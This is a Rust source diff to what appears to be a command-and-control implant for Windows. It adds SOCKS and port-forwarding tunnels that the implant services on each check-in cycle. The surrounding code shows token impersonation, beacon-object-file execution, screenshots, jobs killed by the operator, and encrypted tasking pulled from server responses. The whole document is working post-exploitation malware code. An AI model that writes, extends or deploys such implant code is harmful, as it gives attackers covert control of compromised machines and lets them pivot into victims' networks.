@@ -87,6 +87,13 @@ pub struct Instance {
     pub next_token_id: u32,
     /// Id of the token currently impersonated (0 = none).
     pub active_token: u32,
+    /// ws2_32 module (tunnels): null until the first tunnel task loads
+    /// it and runs WSAStartup (tunnel_surface).
+    pub ws2: *mut c_void,
+    /// Tunnel channels (socks/lportfwd/rportfwd): connected sockets and
+    /// the rportfwd listener, drained every cycle.
+    pub tunnels: [crate::tasks::Tunnel; crate::tasks::MAX_TUNNELS],
+    pub tunnels_len: usize,
     /// Live jobs (ps run): the process handle, its pid and the stdout
     /// pipe read end. The id is the original task id (the operator kills
     /// by this id).
@@ -401,6 +408,9 @@ unsafe fn bootstrap() -> Option<Instance> {
         tokens_len: 0,
         next_token_id: 0,
         active_token: 0,
+        ws2: core::ptr::null_mut(),
+        tunnels: [crate::tasks::Tunnel::EMPTY; crate::tasks::MAX_TUNNELS],
+        tunnels_len: 0,
         upload: None,
         bof_pending: None,
         // The handle opened at the very top of the bootstrap carries over.
@@ -586,6 +596,7 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
     crate::tasks::screenshot_tick(instance, &mut w);
     crate::coff::bof_tick(instance, &mut w);
     crate::tasks::jobs_tick(instance, &mut w);
+    crate::tasks::tunnel_tick(instance, &mut w);
     if !transport::finish_results(&mut w) {
         crate::runtime::debug::log(instance, b"ci: fail results\n");
         return;
@@ -624,6 +635,13 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         }
     };
     crate::runtime::debug::log(instance, b"ci: posted\n");
+    // The queued records just went out: consume the queue. A failed POST
+    // returns above and keeps the queue for the retry; without this the
+    // same records ride every following POST (an empty-response cycle
+    // never reaches the dispatch epilogue that resets results_len) —
+    // the server then acts on them twice (e.g. a tunnel start record
+    // resumes the connection and sends the SOCKS5 reply twice).
+    instance.results_len = 0;
 
     // Response page: template payload, session-decrypted in place.
     let (start, end) = match transport::extract_payload_range(
@@ -673,6 +691,18 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         if r.peek_u32_le() == Some(transport::COMMAND_EXEC_BOF) {
             match transport::parse_exec_bof(&mut r) {
                 Some(task) => crate::coff::exec(instance, &task, &mut w),
+                None => break,
+            }
+            continue;
+        }
+        // TUNNEL_WRITE_TCP payloads are tunnel-manager chunks: inline
+        // parse, the data borrows the response buffer (never inline in
+        // the Task enum — a big Copy variant breaks clean builds).
+        if r.peek_u32_le() == Some(transport::COMMAND_TUNNEL_WRITE_TCP) {
+            match transport::parse_tunnel_write(&mut r) {
+                Some((channel_id, data)) => {
+                    crate::tasks::tunnel_write_tcp(instance, channel_id, data);
+                }
                 None => break,
             }
             continue;
